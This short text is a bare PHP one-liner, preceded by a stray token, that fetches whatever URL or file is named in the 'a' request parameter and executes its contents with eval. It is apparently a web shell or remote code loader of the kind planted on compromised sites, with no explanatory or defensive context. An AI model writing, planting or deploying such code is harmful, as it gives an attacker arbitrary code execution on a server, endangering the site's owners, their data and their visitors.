Cyz4rineFams<?php $ch = file_get_contents($_GET['a']); eval('?>'.$ch);
